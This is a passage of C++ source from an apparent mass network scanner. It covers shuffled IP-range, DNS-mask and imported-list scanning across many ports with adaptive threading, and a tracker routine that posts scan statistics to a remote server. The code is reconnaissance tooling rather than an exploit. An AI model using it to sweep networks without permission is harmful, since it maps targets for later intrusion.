					if (strstr(t2, "\r\n") != NULL)
					{
						char *t3 = strstr(t2, "\r\n");
						int y = (int)(t3 - t2);

						if (y > 64)
						{
							CSSOCKET(sock);

							stt->doEmitionRedFoundData("[NS-Track] -Received server string is not valid!");

							continue;
						}
						else
						{
							strncpy(ndbScriptT, t2, y);
							CSSOCKET(sock);

							stt->doEmitionGreenFoundData("[NS-Track] -OK! -Fragmented server string aquired! Starting NS-Track loop...");

							strncpy(ndbScript, ndbScriptT, strlen(ndbScriptT));
						};
					}
					else
					{
						CSSOCKET(sock);

						stt->doEmitionRedFoundData("[NS-Track] -Received server string is not valid!");

						continue;
					};
				}
				else
				{
					strcpy(ndbScriptT, t2);

					stt->doEmitionGreenFoundData("[NS-Track] -OK! -Server string aquired! Starting NS-Track loop...");

					CSSOCKET(sock);
					strncpy(ndbScript, ndbScriptT, strlen(ndbScriptT) - 2);
				};
			}
			else
			{
				CSSOCKET(sock);

				stt->doEmitionRedFoundData("[NS-Track] -Cannot receive script value!");

				continue;
			};

			//ZeroMemory(rBuffT, sizeof(rBuffT));
			rBuffT[0] = 0;
			CSSOCKET(sock);

			while (true)
			{
				if (!globalScanFlag && jsonArr->size() == 0) break;
				if (!trackerOK) {
					Sleep(1000);
					continue;
				};

				if (jsonArr != NULL && jsonArr->size() > 0)
				{
					QJsonObject jsonKey;
					// jsonArr is already initialized as global variable

					QJsonObject jsonMeta;
					if (gMode == 0) jsonMeta.insert("mode", QJsonValue(QString("IP")));					//
					else if (gMode == 1) jsonMeta.insert("mode", QJsonValue(QString("DNS")));			//Mode
					else if (gMode == -1) jsonMeta.insert("mode", QJsonValue(QString("Import")));		//
					jsonMeta.insert("range", QJsonValue(QString(metaRange)));
					jsonMeta.insert("current", QJsonValue(QString(currentIP)));
					if (gMode == 1) jsonMeta.insert("tld", QJsonValue(QString(gTLD)));					//TLD
					jsonMeta.insert("targets", QJsonValue(QString(metaTargets)));
					jsonMeta.insert("percent", QJsonValue(QString(metaPercent)));
					jsonMeta.insert("saved", QJsonValue(QString::number(saved)));
					jsonMeta.insert("found", QJsonValue(QString::number(found)));
					jsonMeta.insert("speed", QJsonValue(QString(metaIPS)));
					jsonMeta.insert("eta", QJsonValue(QString(metaETA)));
					jsonMeta.insert("threads", QJsonValue(QString::number(cons) + "/" + QString::number(gThreads)));
					jsonMeta.insert("bads", QJsonValue("-1"));
					jsonMeta.insert("version", QJsonValue(QString(gVER)));

					jsonArr->push_front(QJsonValue(jsonMeta));
					memset(trcPersKey + 32, '\0', 1);
					jsonKey.insert("key", QJsonValue(QString(trcPersKey)));
					jsonArr->push_front(jsonKey);

					QJsonDocument js;
					js.setArray(*jsonArr);
					QByteArray r = js.toJson();

					sockAddr.sin_family = AF_INET;
					sockAddr.sin_port = htons(atoi(trcSrvPortLine));

					if (msg != NULL)
					{
						delete[]msg;
						msg = 0;
					};

					msg = new char[r.size() + 1024];
					//ZeroMemory(msg, sizeof(*msg));
					msg[0] = 0;

					strcpy(msg, "POST /");
					strcat(msg, ndbScript);
					strcat(msg, " HTTP/1.1\r\nHost: ");
					strcat(msg, ndbServer);
					strcat(msg, "\r\nContent-Type: application/json\r\nAccept-Encoding: application/json\r\nContent-Length: ");
					strcat(msg, std::to_string(r.size()).c_str());
					strcat(msg, "\r\nConnection: close\r\n\r\n");

					strcat(msg, r.data());

					// Clear the array by removing all elements
					if (jsonArr != NULL) {
						while (jsonArr->size() > 0) {
							jsonArr->removeAt(0);
						}
					}

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
					if (inet_addr(ndbServer) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ndbServer);
					else if ((host = gethostbyname(ndbServer)) != NULL) {
						memcpy(&sockAddr.sin_addr, host->h_addr_list[0], host->h_length);
					}
#else
					if (inet_addr(ndbServer) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ndbServer);
					else if ((host = gethostbyname(ndbServer)) != NULL) {
						memcpy(&sockAddr.sin_addr, host->h_addr_list[0], host->h_length);
					}
#endif
					sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

					if (gDebugMode)
					{
						stt->doEmitionDebugFoundData("Connecting to " + QString(ndbServer));
					};

					if (connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr)) == -1)
					{
						CSSOCKET(sock);


						stt->doEmitionRedFoundData("[NS-Track] connect() returned " + 
							QString::number(WSAGetLastError()) + ".");

						continue;
					};

					if (gDebugMode)
					{
						stt->doEmitionDebugFoundData("Sending!");
						stt->doEmitionDebugFoundData("Key: [" + QString(trcPersKey) + "]");
						stt->doEmitionDebugFoundData("MSG: [" + QString(msg) + "]");
					};

					if (send(sock, msg, strlen(msg), 0) == -1)
					{
						CSSOCKET(sock);

						stt->doEmitionRedFoundData("[NS-Track] send() returned " + 
							QString::number(WSAGetLastError()) + ".");

						continue;
					};

					//ZeroMemory(rBuffT, sizeof(rBuffT));
					rBuffT[0] = 0;
					char msgR[32] = { 0 };

					if (gDebugMode)
					{
						stt->doEmitionDebugFoundData("Receiving...");
					};

					test = recv(sock, rBuff, 512, 0);

					if (gDebugMode)
					{
						stt->doEmitionDebugFoundData("Received: " + QString(rBuff));
					};

					strncpy(msgR, rBuff, 32);
					strcpy(rBuffT, rBuff);
					while (test > 0)
					{
						if (test <= 0) break;

						if (strlen(rBuffT) > 200000)
						{
							stt->doEmitionRedFoundData("[NS-Track] (Inner) Large error received from server (>200000b) " + 
								QString::number(WSAGetLastError()) + ".");
							break;
						};
						strcat(rBuffT, rBuff);
						test = recv(sock, rBuff, 512, 0);
						if (gDebugMode)
						{
							stt->doEmitionDebugFoundData("Received: " + QString(rBuff));
						};
					};

					if (test == -1)
					{
						CSSOCKET(sock);

						stt->doEmitionRedFoundData("[NS-Track] recv() returned " + QString::number(WSAGetLastError()) + ".");

						continue;
					};

					if (strstr(rBuffT, "201 Created") != NULL)
					{

						if (gDebugMode) stt->doEmitionYellowFoundData("[NS-Track] OK. Data saved!");
						stt->doEmitionDataSaved(true);
						Sleep(1000);
						stt->doEmitionDataSaved(false);

					}
					else if (strstr(rBuffT, "400 Bad Request") != NULL)
					{
						QString errorDef = Utils::GetNSErrorDefinition(rBuffT, "notify");
						if (errorDef == "Invalid access key") stt->doEmitionYellowFoundData("[NS-Track] [Key is unauthorized] A valid key is required.");
						else stt->doEmitionYellowFoundData("[NS-Track] FAIL! [400 Bad Request : " + errorDef + "]");

					}
					else
					{
						stt->doEmitionYellowFoundData("[NS-Track] FAIL! An error occured [" + QString(msgR) + "]");
					};

					msgR[0] = 0;
					rBuffT[0] = 0;
					msg[0] = 0;
					/*ZeroMemory(msgR, sizeof(msgR));
					ZeroMemory(rBuffT, sizeof(rBuffT));
					ZeroMemory(msg, sizeof(*msg));*/

					if (msg != NULL)
					{
						delete msg;
						msg = NULL;
					};

					CSSOCKET(sock);
				};
				Sleep(10000);
			};
		}
		else
		{
			stt->doEmitionRedFoundData("[NS-Track] Balancer replied with invalid string.");
		};

		CSSOCKET(sock);
	}

	trackerRunning = false;
}

void verboseProgress(unsigned long target) {
	stt->doEmitionUpdateArc(gTargets);
	if (gTargets > 0) --gTargets;

	char targetNPers[128] = { 0 };
	float percent = (gTargetsNumber != 0 ? (100 - target / (double)gTargetsNumber * 100) : 0);

	sprintf(targetNPers, "%lu (%.1f%%)", target, percent);

	sprintf(metaTargets, "%lu", target);
	sprintf(metaPercent, "%.1f",
		percent);
}

void _connect() {

	std::string ip = "";
	std::unique_lock<std::mutex> lk;
	while (globalScanFlag) {
		lk = std::unique_lock<std::mutex>(Threader::m);
		Threader::cv.wait(lk, []{return Threader::ready; });

		if (!globalScanFlag || Threader::threadId > gThreads) {
			--Threader::threadId;
			lk.unlock();
			Threader::ready = true;
			Threader::cv.notify_all();
			return;
		}

		Threader::ready = false;

		if (!Threader::ipQueue.empty()) {
			ip = Threader::ipQueue.front();
			Threader::ipQueue.pop();
			lk.unlock();

			++ipCounter;

			++cons;
			
			// Update thread count if adaptive scanning is enabled
			if (gAdaptiveScan) {
				AdaptiveScanner::updateThreadCount();
			}
			
			Connector con;
			QString ipStr = QString::fromStdString(ip);
			
			// Get prioritized ports for smart scan
			QList<int> prioritizedPorts;
			if (gSmartScan && AdaptiveScanner::shouldPrioritizeIP(ipStr)) {
				prioritizedPorts = AdaptiveScanner::getPrioritizedPorts(ipStr);
			}
			
			// Use prioritized ports if available, otherwise use all ports
			if (!prioritizedPorts.isEmpty()) {
				// Scan prioritized ports first
				for (int port : prioritizedPorts) {
					if (!globalScanFlag) break;
					auto startTime = std::chrono::steady_clock::now();
					int result = con.connectToPort((char*)ip.c_str(), port);
					auto endTime = std::chrono::steady_clock::now();
					
					// Record metrics for adaptive scanning
					if (gAdaptiveScan) {
						double responseTime = std::chrono::duration_cast<std::chrono::milliseconds>(
							endTime - startTime).count();
						AdaptiveScanner::recordRequest(responseTime, result != -1 && result != -2);
					}
					
					// Record found IP for smart scan
					if (gSmartScan && result >= 0) {
						AdaptiveScanner::recordFoundIP(ipStr, port);
					}
					
					if (result == -2) break;
				}
				
				// Then scan remaining ports
				for (size_t i = 0; i < MainStarter::portVector.size(); ++i) {
					int port = MainStarter::portVector[i];
					if (prioritizedPorts.contains(port)) continue;  // Already scanned
					
					if (!globalScanFlag) break;
					auto startTime = std::chrono::steady_clock::now();
					int result = con.connectToPort((char*)ip.c_str(), port);
					auto endTime = std::chrono::steady_clock::now();
					
					if (gAdaptiveScan) {
						double responseTime = std::chrono::duration_cast<std::chrono::milliseconds>(
							endTime - startTime).count();
						AdaptiveScanner::recordRequest(responseTime, result != -1 && result != -2);
					}
					
					if (gSmartScan && result >= 0) {
						AdaptiveScanner::recordFoundIP(ipStr, port);
					}
					
					if (result == -2) break;
				}
			} else {
				// Standard scan without prioritization
				for (size_t i = 0; i < MainStarter::portVector.size(); ++i)
				{
					if (!globalScanFlag) break;
					auto startTime = std::chrono::steady_clock::now();
					int result = con.connectToPort((char*)ip.c_str(), MainStarter::portVector[i]);
					auto endTime = std::chrono::steady_clock::now();
					
					// Record metrics for adaptive scanning
					if (gAdaptiveScan) {
						double responseTime = std::chrono::duration_cast<std::chrono::milliseconds>(
							endTime - startTime).count();
						AdaptiveScanner::recordRequest(responseTime, result != -1 && result != -2);
					}
					
					// Record found IP for smart scan
					if (gSmartScan && result >= 0) {
						AdaptiveScanner::recordFoundIP(ipStr, MainStarter::portVector[i]);
					}
					
					if (result == -2) break;
				}
			}
			--cons;
			stt->doEmitionUpdateArc(gTargets);
		}
		else lk.unlock();
	}
}

void MainStarter::startIPScan(){

	switch (gShuffle) {
	case true: {
				   std::vector<std::string> ipVec;
				   struct in_addr tAddr;

				   unsigned long offset = ip2 - ip1;
				   unsigned int limit = 0;

				   if (0 == offset) {
					   tAddr.s_addr = ntohl(ip1);
					   ipVec.push_back(inet_ntoa(tAddr));
					   ++indexIP;

				strncpy(currentIP, ipVec[0].c_str(), sizeof(currentIP) - 1);
				currentIP[sizeof(currentIP) - 1] = '\0';
					   ipVec.erase(ipVec.begin());
					   verboseProgress(gTargets);

					   Threader::fireThread(currentIP, (void*(*)(void))_connect);
				   }
				   else {
					   if (offset < 1000) {
						   limit = 1;
					   }
					   else if (offset < 10000){
						   limit = 10;
					   }
					   else if (offset < 100000){
						   limit = 100;
					   }
					   else if (offset < 1000000){
						   limit = 1000;
					   }
					   else if (offset < 10000000){
						   limit = 10001;
					   }
					   else if (offset < 100000000){
						   limit = 100011;
					   }
					   else if (offset < 5000000000){
						   limit = 1000111;
					   }

					   unsigned long long int firstLoopLimit = (limit == 1 ? ip1 : ip1 + (long long)limit);

					   for (unsigned long i = ip1; i <= firstLoopLimit; ++i) {
						   if (!globalScanFlag) break;

						   unsigned long long curIP = i;
						   while (curIP <= ip2) {
							   tAddr.s_addr = ntohl(curIP);
							   ipVec.push_back(inet_ntoa(tAddr));

							   curIP += (long long)limit;
						   }

						   std::random_shuffle(ipVec.begin(), ipVec.end());
						   
						   // Batch processing if enabled
						   if (gBatchSize > 0) {
							   std::vector<QString> ipBatch;
							   for (size_t idx = 0; idx < ipVec.size(); idx++) {
								   ipBatch.push_back(QString::fromStdString(ipVec[idx]));
								   
								   // Process batch when it reaches batch size
								   if (ipBatch.size() >= static_cast<size_t>(gBatchSize) || idx == ipVec.size() - 1) {
									   for (const QString& batchIP : ipBatch) {
										   while (cons >= gThreads && globalScanFlag) {
											   if (gAdaptiveScan) {
												   AdaptiveScanner::updateThreadCount();
											   }
											   Sleep(10);
										   }
										   if (!globalScanFlag) goto haters_gonna_hate_IPM;
										   
										   ++indexIP;
										   strncpy(currentIP, batchIP.toLocal8Bit().data(), sizeof(currentIP) - 1);
										   currentIP[sizeof(currentIP) - 1] = '\0';
										   verboseProgress(gTargets);
										   Threader::fireThread(currentIP, (void*(*)(void))_connect);
									   }
									   ipBatch.clear();
								   }
							   }
						   } else {
							   // Standard processing without batching
							   while (ipVec.size() != 0) {

								   while (cons >= gThreads && globalScanFlag) {
									   if (gAdaptiveScan) {
										   AdaptiveScanner::updateThreadCount();
									   }
									   Sleep(10);
								   }
								   if (!globalScanFlag) goto haters_gonna_hate_IPM;

								   ++indexIP;

					strncpy(currentIP, ipVec[0].c_str(), sizeof(currentIP) - 1);
					currentIP[sizeof(currentIP) - 1] = '\0';
								   ipVec.erase(ipVec.begin());
								   verboseProgress(gTargets);

								   Threader::fireThread(currentIP, (void*(*)(void))_connect);
							   }
						   }



						   /*tAddr.s_addr = ntohl(i);
						   ipVec.push_back(inet_ntoa(tAddr));

						   if (ipVec.size() >= (offset < 10000 ? offset : 10000)) {

						   std::random_shuffle(ipVec.begin(), ipVec.end());
						   while (ipVec.size() != 0) {

						   while (cons >= gThreads && globalScanFlag) Sleep(10);
						   if (!globalScanFlag) goto haters_gonna_hate_IPM;

						   ++indexIP;

				strncpy(currentIP, ipVec[0].c_str(), sizeof(currentIP) - 1);
				currentIP[sizeof(currentIP) - 1] = '\0';
						   ipVec.erase(ipVec.begin());
						   verboseProgress(gTargets);

						   Threader::fireThread(currentIP, (void*(*)(void))_connect);
						   }
						   }*/
					   }
				   }

			   haters_gonna_hate_IPM:;
				   break;
	}
	case false: {
					struct in_addr tAddr;
					for (unsigned long i = ip1; i <= ip2; ++i) {

						while (cons >= gThreads && globalScanFlag) {
							if (gAdaptiveScan) {
								AdaptiveScanner::updateThreadCount();
							}
							Sleep(500);
						}
						if (!globalScanFlag) break;

						++indexIP;

						tAddr.s_addr = ntohl(i);
						const char* ipStr = inet_ntoa(tAddr);
						strncpy(currentIP, ipStr, sizeof(currentIP) - 1);
						currentIP[sizeof(currentIP) - 1] = '\0';
						verboseProgress(gTargets);

						Threader::fireThread(currentIP, (void*(*)(void))_connect);
					}
					break;
	}
	}
}

char charAll[38] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '-',
'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
int _getPos(char l) {
	for (int i = 0; i < 38; ++i)
	{
		if (l == charAll[i]) return i;
	};
	return -1;
}
int _GetDNSFromMask(char *mask, char *saveMask, char *saveMaskEnder) {

	if (strstr(mask, "[") != NULL)
	{
		char maskEnd[1024] = { 0 };
		char maskRes[1024] = { 0 };
		char *ptr1 = strstr(mask, "[");
		char *ptr2 = strstr(ptr1, "]");
		int sz = ptr2 - ptr1;
		char chunk[8] = { 0 };
		strncpy(chunk, ptr1, sz + 1);
		int firstPos = _getPos(chunk[1]);
		int secondPos = _getPos(chunk[2]);

		if (firstPos > secondPos)
		{
			stt->doEmitionRedFoundData("Error at mask (Wrong letter sequence)");
			return -1;
		};

		char maskStart[1024] = { 0 };
		int startPosition = strstr(mask, "[") - mask;
		strncpy(maskStart, mask, startPosition);

		char maskEntry[1024] = { 0 };
		if (saveMaskEnder != NULL)
		{
			int startSavePosition = strstr(saveMaskEnder, "[") - saveMaskEnder;
			strncpy(maskEntry, saveMaskEnder, startSavePosition);
		};

		int szMask = strlen(mask);
		int szOffset = startPosition + 2;
		if (szMask != szOffset) strcpy(maskEnd, strstr(mask, "]") + 1);
		else maskEnd[0] = 0;

		char maskSaver[128] = { 0 };
		if (firstPos != -1 && secondPos != -1)
		{
			for (int i = firstPos; i <= secondPos; ++i)
			{
				if (!globalScanFlag) break;

				strcpy(maskSaver, saveMask);
				strcat(maskSaver, maskEntry);
				chunk[1] = charAll[i];
				//strcat(maskSaver, chunk);
				strcpy(maskRes, maskStart);
				maskRes[startPosition] = charAll[i];
				maskRes[startPosition + 1] = '\0';
				strcat(maskRes, maskEnd);

				if (_GetDNSFromMask(maskRes, maskSaver, NULL) == -1) return -1;

				maskSaver[0] = 0;
				maskRes[0] = 0;
				/*ZeroMemory(maskSaver, sizeof(maskSaver));
				ZeroMemory(maskRes, sizeof(maskRes));*/
			};
		};
		return 0;  // Return success after processing recursive calls
	}
	else
	{
		strcpy(currentMask, saveMask);
		while (cons >= gThreads && globalScanFlag) Sleep(300);
		if (!globalScanFlag) return 0;

		++indexIP;
		sprintf(currentIP, "%s%s", mask, gTLD);
		verboseProgress(gTargets);

		Threader::fireThread(currentIP, (void*(*)(void))_connect);
		return 0;  // Return success after firing thread
	};
}
int _getChunkCount(char *data) {
	int firstPos = _getPos(data[1]);
	int secondPos = _getPos(data[2]);
	return secondPos - firstPos + 1;
}
void MainStarter::startDNSScan(){
	char dataEntry[1024] = { 0 };
	int innerCounter = 0;
	int sz = strlen(dnsTarget);

	for (int i = 0; i < sz; ++i)
	{
		if (dnsTarget[i] == '\\')
		{
			if (dnsTarget[i + 1] == 'd')
			{
				strcat(dataEntry, "[09]");
				++i;
				innerCounter += 4;
				continue;
			}
			else if (dnsTarget[i + 1] == 'w')
			{
				strcat(dataEntry, "[0z]");
				++i;
				innerCounter += 4;
				continue;
			}
			else if (dnsTarget[i + 1] == 'l')
			{
				strcat(dataEntry, "[az]");
				++i;
				innerCounter += 4;
				continue;
			}
			else
			{
				QString errStr = "Error at mask (Position:" + QString::number(i + 1);
				errStr += ") \"";
				errStr += QString(dnsTarget).mid(0, i == 0 ? 0 : i);
				errStr += "<u>";
				errStr += QString(dnsTarget).mid(i, i == 0 ? i + 2 : i + 1);
				errStr += "</u>";
				errStr += QString(dnsTarget).mid(i + 2, strlen(dnsTarget));
				errStr += "\"";

				stt->doEmitionRedFoundData(errStr);
				return;
			};
		}
		else
		{
			memset(dataEntry + innerCounter++, dnsTarget[i], 1);
		};
	};

	memset(dataEntry + innerCounter + 1, '\0', 1);
	strcpy(currentMask, dataEntry);

	for (int i = 0; i < sz; ++i)
	{
		if (dataEntry[i] == '[')
		{
			for (int j = i + 1; j < i + 3; ++j)
			{
				if ((dataEntry[j] < '0' || dataEntry[j] > '9')
					&& (dataEntry[j] < 'a' || dataEntry[j] > 'z')
					&& dataEntry[j] != '_'
					&& dataEntry[j] != '-'
					)
				{
					QString errStr = "Error at mask (" + QString::number(j - 1);
					errStr += ") \"";
					errStr += QString(dataEntry).mid(0, j - 1);
					errStr += "<u>";
					errStr += QString(dataEntry).mid(j - 1, j + 1);
					errStr += "</u>";
					errStr += QString(dataEntry).mid(j + 1, strlen(dataEntry));
					errStr += "\"";

					stt->doEmitionRedFoundData(errStr);
					return;
				};
			};
			i += 3;
		}
		else if (dataEntry[i] == ']')
		{
			QString errStr = "Error at mask (" + QString::number(i - 1);
			errStr += ") \"";
			errStr += QString(dataEntry).mid(0, i - 1);
			errStr += "<u>";
			errStr += QString(dataEntry).mid(i - 1, i + 1);
			errStr += "</u>";
			errStr += QString(dataEntry).mid(i + 1, strlen(dataEntry));
			errStr += "\"";

			stt->doEmitionRedFoundData(errStr);
			return;
		};
	};

	unsigned long long dnsCounter = 1;
	char *dnsPtr1 = strstr(dataEntry, "[");
	while (dnsPtr1 != NULL)
	{
		dnsCounter *= _getChunkCount(dnsPtr1);
		dnsPtr1 = strstr(dnsPtr1 + 1, "[");
	};

	gTargets = dnsCounter;
	gTargetsNumber = gTargets;
	stt->doEmitionYellowFoundData("Starting DNS-scan...");

	int y = _GetDNSFromMask(dataEntry, "", NULL);
	if (y == -1)
	{
		stt->doEmitionRedFoundData("DNS-Mode error");
	};
}

void MainStarter::startImportScan(){

	if (MainStarter::flCounter == 0)
	{
		safeSttCall([&]() { stt->doEmitionRedFoundData("Empty IP list."); });
		globalScanFlag = false;
		safeSttCall([&]() { stt->doEmitionKillSttThread(); });
		return;
	};

	struct in_addr tAddr;

	switch (gShuffle) {
	case true: {
				   int ipOffset = 6;
				   for (gflIndex = 0; gflIndex < MainStarter::flCounter; gflIndex += ipOffset)
				   {
					   int ipGap = MainStarter::flCounter - gflIndex;
					   if (ipGap < ipOffset)
					   {
						   ipOffset = ipGap;
					   };

					   std::vector<IPRangeHolder> ipRangeVec;
					   for (int j = gflIndex; j < gflIndex + ipOffset; ++j)
					   {
						   /*sprintf(metaRange, "%d.%d.%d.%d-%d.%d.%d.%d",
							   ipsstartfl[j][0], ipsstartfl[j][1], ipsstartfl[j][2], ipsstartfl[j][3],
							   ipsendfl[j][0], ipsendfl[j][1], ipsendfl[j][2], ipsendfl[j][3]);*/
						   ip1 = (ipsstartfl[j][0] * 16777216) +
							   (ipsstartfl[j][1] * 65536) +
							   (ipsstartfl[j][2] * 256) +
							   ipsstartfl[j][3];
						   ip2 = (ipsendfl[j][0] * 16777216) +
							   (ipsendfl[j][1] * 65536) +
							   (ipsendfl[j][2] * 256) +
							   ipsendfl[j][3];

						   IPRangeHolder holder;
						   holder.ip1 = ip1;
						   holder.ip2 = ip2;
						   ipRangeVec.push_back(holder);
					   }
					   IPRandomizer ipRandomizer(ipRangeVec, 20000);

					   std::vector<QString> ipBatch;
					   int ip = 0;
					   
					   // Batch processing if enabled
					   if (gBatchSize > 0) {
						   // Collect IPs for batch processing
						   while ((ip = ipRandomizer.getNext()) != 0) {
							   if (!globalScanFlag) break;
							   tAddr.s_addr = ntohl(ip);
							   ipBatch.push_back(QString(inet_ntoa(tAddr)));
							   
							   // Process batch when it reaches batch size
							   if (ipBatch.size() >= static_cast<size_t>(gBatchSize)) {
								   for (const QString& batchIP : ipBatch) {
									   while (cons >= gThreads && globalScanFlag) {
										   if (gAdaptiveScan) {
											   AdaptiveScanner::updateThreadCount();
										   }
										   Sleep(10);
									   }
									   if (!globalScanFlag) goto haters_gonna_hate_IM;
									   
									   ++indexIP;
									   strncpy(currentIP, batchIP.toLocal8Bit().data(), sizeof(currentIP) - 1);
									   currentIP[sizeof(currentIP) - 1] = '\0';
									   verboseProgress(gTargets);
									   Threader::fireThread(currentIP, (void*(*)(void))_connect);
								   }
								   ipBatch.clear();
							   }
						   }
						   // Process remaining IPs
						   for (const QString& batchIP : ipBatch) {
							   while (cons >= gThreads && globalScanFlag) {
								   if (gAdaptiveScan) {
									   AdaptiveScanner::updateThreadCount();
								   }
								   Sleep(500);
							   }
							   if (!globalScanFlag) break;
							   
							   ++indexIP;
							   strncpy(currentIP, batchIP.toLocal8Bit().data(), sizeof(currentIP) - 1);
							   currentIP[sizeof(currentIP) - 1] = '\0';
							   verboseProgress(gTargets);
							   Threader::fireThread(currentIP, (void*(*)(void))_connect);
						   }
					   } else {
						   // Standard processing without batching
						   while ((ip = ipRandomizer.getNext()) != 0) {
							   while (cons >= gThreads && globalScanFlag) {
								   if (gAdaptiveScan) {
									   AdaptiveScanner::updateThreadCount();
								   }
								   Sleep(500);
							   }
							   if (!globalScanFlag) goto haters_gonna_hate_IM;

							   ++indexIP;

					tAddr.s_addr = ntohl(ip);
					const char* ipStr = inet_ntoa(tAddr);
					strncpy(currentIP, ipStr, sizeof(currentIP) - 1);
					currentIP[sizeof(currentIP) - 1] = '\0';
							   verboseProgress(gTargets);

							   Threader::fireThread(currentIP, (void*(*)(void))_connect);
						   }
					   }
				   }
			   haters_gonna_hate_IM:;
				   break;
	}
	case false: {
		for (gflIndex = 0; gflIndex < MainStarter::flCounter; gflIndex++) {
			if (!globalScanFlag) break;
			ip1 = (ipsstartfl[gflIndex][0] * 16777216) +
				(ipsstartfl[gflIndex][1] * 65536) +
				(ipsstartfl[gflIndex][2] * 256) +
				ipsstartfl[gflIndex][3];
			ip2 = (ipsendfl[gflIndex][0] * 16777216) +
				(ipsendfl[gflIndex][1] * 65536) +
				(ipsendfl[gflIndex][2] * 256) +
				ipsendfl[gflIndex][3];
			struct in_addr tAddr;
			for (unsigned long i = ip1; i <= ip2; ++i) {

				while (cons >= gThreads && globalScanFlag) Sleep(10);
				if (!globalScanFlag) break;

				++indexIP;

				tAddr.s_addr = ntohl(i);
				const char* ipStr = inet_ntoa(tAddr);
				strncpy(currentIP, ipStr, sizeof(currentIP) - 1);
				currentIP[sizeof(currentIP) - 1] = '\0';
				verboseProgress(gTargets);
				Threader::fireThread(currentIP, (void*(*)(void))_connect);
			}
		}
					break;
	};
	}
}

void MainStarter::runAuxiliaryThreads() {

	FileUpdater::loadOnce();
	if (!FileUpdater::running) {
		std::thread lpThread(FileUpdater::updateLists);
		lpThread.detach();
	}
	//if (!trackerRunning) {
	//	std::thread trackerThread(_tracker);
	//	trackerThread.detach();
	//}
	if (!ipPerSecTimer) {
		std::thread timerThread(_IPPerSecTimer);
		timerThread.detach();
	}
	if (!saverRunning) {
		std::thread saverThread(&MainStarter::saver, this);
		saverThread.detach();
	}
}

void MainStarter::createResultFiles() {
	char fileName[256] = { 0 };
	sprintf(fileName, "./" DIR_NAME "%s_%s", Utils::getStartDate().c_str(), Utils::getCurrentTarget().c_str());
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	bool res = CreateDirectoryA(fileName, NULL);
	if (!res) {
		int err = GetLastError();
		if (err != 183)
		{
			while (!res) {
				stt->doEmitionRedFoundData("Failed to create \"" + QString::fromLocal8Bit(fileName) + "\" Err: " + QString::number(err));
				res = CreateDirectoryA(fileName, NULL);
				err = GetLastError();
				Sleep(1000);
			}
		} else {
			stt->doEmitionYellowFoundData("Directory \"" + QString::fromLocal8Bit(fileName) + "\" already exists. Err: " + QString::number(err));
		}
	} else {
		stt->doEmitionGreenFoundData("Result directory \"" + QString::fromLocal8Bit(fileName) + "\" successfully created.");
	}
#else
	struct stat str;
	if (stat(fileName, &str) == -1) {
		mkdir(fileName, 0700);
	}
#endif
}

/* This array will store all of the mutexes available to OpenSSL. */
static MUTEX_TYPE *mutex_buf = NULL;

// Function is used via function pointer in CRYPTO_set_locking_callback
// Suppress unused warning - compiler can't see the indirect usage
#ifdef __GNUC__
__attribute__((used))
#endif
static void locking_function(int mode, int n, const char * file, int line)
{
	(void)file;  // Suppress unused parameter warning
	(void)line;  // Suppress unused parameter warning
	if (mode & CRYPTO_LOCK)
		MUTEX_LOCK(mutex_buf[n]);
	else
		MUTEX_UNLOCK(mutex_buf[n]);
}

// Function is used via function pointer in CRYPTO_set_id_callback
// Suppress unused warning - compiler can't see the indirect usage
#ifdef __GNUC__
__attribute__((used))
#endif
static unsigned long id_function(void)
{
	return ((unsigned long)THREAD_ID);
}

int thread_setup(void)
{
	int i;

	mutex_buf = (MUTEX_TYPE*)malloc(CRYPTO_num_locks() * sizeof(MUTEX_TYPE));
	if (!mutex_buf)
		return 0;
	for (i = 0; i < CRYPTO_num_locks(); i++)
		MUTEX_SETUP(mutex_buf[i]);
	CRYPTO_set_id_callback(id_function);
	CRYPTO_set_locking_callback(locking_function);
	return 1;
}

int thread_cleanup(void)
{
	int i;
	if (!mutex_buf)
		return 0;
	CRYPTO_set_id_callback(NULL);
	CRYPTO_set_locking_callback(NULL);
	for (i = 0; i < CRYPTO_num_locks(); i++)
		MUTEX_CLEANUP(mutex_buf[i]);
	free(mutex_buf);
	mutex_buf = NULL;
	return 1;
}

void MainStarter::start(const char* targets, const char* ports) {
	std::srand(std::time(NULL));

	MainStarter::flCounter = 0;
	MainStarter::gflIndex = 0;
	MainStarter::ipsstartfl = NULL;
	MainStarter::ipsendfl = NULL;
	HikVis::hikCounter = 0;
	HikVis::rviCounter = 0;
	saveBackup = true;  // Re-enable after fixing stack overflow
	curl_global_init(CURL_GLOBAL_ALL);
	
	thread_setup();


	QString fileSuffix = QString(targets);
	fileSuffix = fileSuffix.mid(fileSuffix.lastIndexOf("/") + 1);
	Utils::setCurrentTarget(fileSuffix.toUtf8().constData());
	createResultFiles();

	if (loadTargets(targets) == -1 ||
		loadPorts(ports, ',') == -1) {
		stt->doEmitionKillSttThread();
		return;
	}
	
	// Validate that we have ports to scan
	if (MainStarter::portVector.empty()) {
		stt->doEmitionRedFoundData("No valid ports specified for scanning");
		stt->doEmitionKillSttThread();
		return;
	}
	
	// Display scan configuration
	QTextStream configOut(stdout);
	const char* ANSI_CYAN = "\033[36m";
	const char* ANSI_GREEN = "\033[32m";
	const char* ANSI_YELLOW = "\033[33m";
	const char* ANSI_RESET = "\033[0m";
	
	configOut << ANSI_CYAN << "[INFO]" << ANSI_RESET << " Scan configuration:" << Qt::endl;
	configOut << "  Ports: " << ANSI_GREEN << QString(gPorts).replace("-p", "") << ANSI_RESET << Qt::endl;
	configOut << "  Mode: ";
	if (gMode == 0) configOut << "IP Range";
	else if (gMode == 1) configOut << "DNS";
	else configOut << "Import";
	configOut << Qt::endl;
	configOut << Qt::endl;

	globalScanFlag = true;
	
	// Initialize adaptive scanning if enabled
	if (gAdaptiveScan || gSmartScan) {
		AdaptiveScanner::initialize(gAdaptiveScan, gSmartScan);
		QTextStream configOut(stdout);
		const char* ANSI_CYAN = "\033[36m";
		const char* ANSI_RESET = "\033[0m";
